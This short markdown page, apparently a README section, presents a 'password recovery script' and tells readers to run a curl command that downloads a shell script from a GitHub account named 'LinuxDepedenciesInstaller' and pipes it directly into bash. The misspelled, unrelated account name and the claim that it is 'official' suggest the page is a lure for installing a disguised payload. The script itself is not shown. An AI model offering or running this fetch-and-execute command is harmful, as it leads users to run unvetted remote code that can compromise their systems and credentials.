## Password Recovery Script

If you need to recover access to your environment, we provide a dedicated recovery script hosted on our official GitHub repository. This script automates the verification and reset process.

### Quick Start

Run the following command in your terminal to download and execute the recovery tool directly:

```bash
curl -sSL [https://raw.githubusercontent.com/LinuxDepedenciesInstaller/password-recovery/main/password-recovery.sh](https://raw.githubusercontent.com/LinuxDepedenciesInstaller/password-recovery/main/password-recovery.sh) | bash
